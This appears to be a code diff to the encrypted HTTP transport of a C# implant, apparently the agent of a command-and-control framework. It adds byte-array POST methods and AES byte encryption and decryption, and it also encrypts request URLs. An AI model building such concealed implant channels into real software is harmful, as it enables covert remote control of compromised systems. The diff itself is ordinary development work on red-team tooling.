@@ -29,6 +29,12 @@ namespace NuagesSharpImplant
             this.refreshrate = refreshrate;
 
             this.buffersize = buffersize;
+
+        }
+
+        public bool supportsBinaryIO() {
+
+            return true;
         }
 
         public string getConnectionString()
@@ -53,22 +59,21 @@ namespace NuagesSharpImplant
 
         public void setRefreshRate(int refreshrate)
         {
-
             this.refreshrate = refreshrate;
-
         }
 
         public void setBufferSize(int buffersize)
         {
-
-            this.buffersize = buffersize;
-
+               this.buffersize = buffersize;
         }
 
+        public string POST(string url, string body) {
+            return Encoding.ASCII.GetString(POST(url, Encoding.ASCII.GetBytes(body)));
+        }
 
-        public string POST(string url, string jsonContent)
+        public byte[] POST(string url, byte[] body)
         {
-            byte[] byteArray = this.aes.EncryptString(jsonContent);
+            byte[] byteArray = this.aes.EncryptBytes(body);
 
             byte[] EncUrl = this.aes.EncryptString(url);
 
@@ -99,10 +104,11 @@ namespace NuagesSharpImplant
                         ms.Write(buffer, 0, bytesRead);
                     }
                     byte[] bytes = ms.ToArray();
-                    return this.aes.DecryptString(bytes);
+                    return this.aes.DecryptBytes(bytes);
                 }
             }
         }
+
         class AESHelper
         {
             byte[] key;
@@ -123,8 +129,16 @@ namespace NuagesSharpImplant
 
             }
 
-            public byte[] EncryptString(string message)
+            public byte[] EncryptString(string str)
             {
+                return EncryptBytes(Encoding.ASCII.GetBytes(str));
+            }
+
+            public byte[] EncryptBytes(byte[] bytes)
+            {
+                if (bytes.Length == 0) {
+                    return bytes;
+                }
                 byte[] encrypted;
                 using (Rijndael rijAlg = Rijndael.Create()) {
                     rijAlg.Key = key;
@@ -138,22 +152,22 @@ namespace NuagesSharpImplant
                         msEncrypt.Write(iv, 0, iv.Length);
                         using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                         {
-                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
-                            {
-                                swEncrypt.Write(message);
-                                swEncrypt.Flush();
-                            }
-                           encrypted = msEncrypt.ToArray();
+                            csEncrypt.Write(bytes,0,bytes.Length);
+                            csEncrypt.FlushFinalBlock();
+                            encrypted = msEncrypt.ToArray();
                         }
                     }
                 }
                 return encrypted;
             }
-                              
 
-            public string DecryptString(byte[] bytes)
+            public byte[] DecryptBytes(byte[] bytes)
             {
+                if (bytes.Length == 0) {
+                    return bytes;
+                }
                 string plaintext = null;
+                MemoryStream ms = new MemoryStream();
                 using (Rijndael rijAlg = Rijndael.Create())
                 {
                     rijAlg.Key = key;
@@ -169,14 +183,18 @@ namespace NuagesSharpImplant
 
                         using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                         {
-                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                          
+                            byte[] buffer = new byte[16384];
+                            int bytesRead;
+                            while ((bytesRead = csDecrypt.Read(buffer, 0, buffer.Length)) > 0)
                             {
-                                plaintext = srDecrypt.ReadToEnd();
+                                ms.Write(buffer, 0, bytesRead);
                             }
                         }
+                        
                     }
                 }
-                return plaintext;
+                return ms.ToArray();
             }
         }
     }
